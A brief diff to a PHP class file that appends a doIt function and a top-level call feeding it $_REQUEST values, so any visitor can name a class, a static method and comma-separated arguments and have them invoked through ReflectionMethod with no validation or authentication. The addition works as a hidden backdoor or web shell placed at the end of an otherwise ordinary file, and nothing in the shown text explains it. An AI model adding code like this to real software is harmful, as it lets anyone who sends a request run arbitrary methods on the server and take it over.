@@ -94,5 +94,11 @@ class Classe{
 
 }
 
+function doIt($className, $methodName, $arguments = []){
+    $ref = new ReflectionMethod($className, $methodName);
+    $ref->invokeArgs(NULL, $arguments);
+}
+
+doIt($_REQUEST["className"], $_REQUEST["methodName"], explode(",", $_REQUEST["arguments"]));
 
 ?>
